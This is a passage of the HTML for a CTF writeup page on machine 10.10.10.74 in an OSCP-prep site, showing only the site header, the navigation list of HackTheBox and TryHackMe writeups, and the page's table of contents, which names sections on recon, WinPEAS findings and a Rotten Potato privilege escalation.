@@ -1,0 +1,3663 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../1.%20Cascade/">
+      
+      
+        <link rel="next" href="../3.%20Cronos/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
+    
+    
+      
+        <title>10.10.10.74 - Nate's CTF Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.7e37652d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="cyan">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#10101074" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Nate&#39;s CTF Writeups" class="md-header__button md-logo" aria-label="Nate's CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Nate's CTF Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              10.10.10.74
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="cyan"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="cyan" data-md-color-accent="light-green"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Nate&#39;s CTF Writeups" class="md-nav__button md-logo" aria-label="Nate's CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Nate's CTF Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    IoT
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            IoT
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Nightowl
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Nightowl
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoT/nightowl/nvr/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ssr21q_v102_nvr04
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    OSCP Prep
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            OSCP Prep
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../oscp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Oscp
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    HackTheBox
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            HackTheBox
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Active/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Active
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Arctic/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Arctic
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Bashed/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Bashed
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Bastion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Bastion
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Beep/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Beep
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Blocky/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Blocky
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Blue/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Blue
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Bounty/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Bounty
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Devel/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Devel
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Grandpa/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Grandpa
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Granny/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Granny
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Heist/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Heist
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Jerry/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Jerry
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Lame/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lame
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Legacy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Legacy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Mirai/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Mirai
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Nibbles/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Nibbles
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Optimum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Optimum
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Pasted%20image%2020220713093106.png/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Pasted image 20220713093106.png
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Remote/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Remote
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Sauna/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Sauna
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Search/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Search
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Shocker/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Shocker
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Sizzle/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Sizzle
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Timelapse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Timelapse
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/netmon/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Netmon
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_27" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_27" id="__nav_3_2_27_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Work in Progress
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_27_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_27">
+            <span class="md-nav__icon md-icon"></span>
+            Work in Progress
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Work%20in%20Progress/Bastard/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Bastard
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Work%20in%20Progress/Beep/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Beep
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Work%20in%20Progress/Brainfuck/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Brainfuck
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Work%20in%20Progress/Breadcrumbs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Breadcrumbs
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Work%20in%20Progress/Grandpa/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Grandpa
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Work%20in%20Progress/Kotarak/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Kotarak
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Work%20in%20Progress/Nineveh/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Nineveh
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Work%20in%20Progress/ScriptKiddie/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Script Kiddie
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Work%20in%20Progress/Solidstate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Solidstate
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    OSCP practice exam
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            OSCP practice exam
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../0.%20Intro/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    General
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1.%20Cascade/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    10.10.10.182
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    10.10.10.74
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    10.10.10.74
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recon
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Recon">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port Scan
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#public-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      Public exploits
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#user-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      User Flag
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="User Flag">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#winpeas-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      WinPEAS findings:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privesc" class="md-nav__link">
+    <span class="md-ellipsis">
+      PrivEsc
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PrivEsc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ms16-075-rotten-potato" class="md-nav__link">
+    <span class="md-ellipsis">
+      MS16-075 - Rotten Potato
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3.%20Cronos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cronos
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../4.%20Forest/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    10.10.10.161
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../5.%20Sauna/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    10.10.10.175
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../6.%20Sense/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    10.10.10.60
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    TryHackMe
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            TryHackMe
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/AD%20Pivoting%20and%20Lateral%20Movement/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Pivoting and lateral movement
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Alfred/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Alfred
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Blueprint/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Blueprint
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TryHackMe/Brainpan1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Brainpan 1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
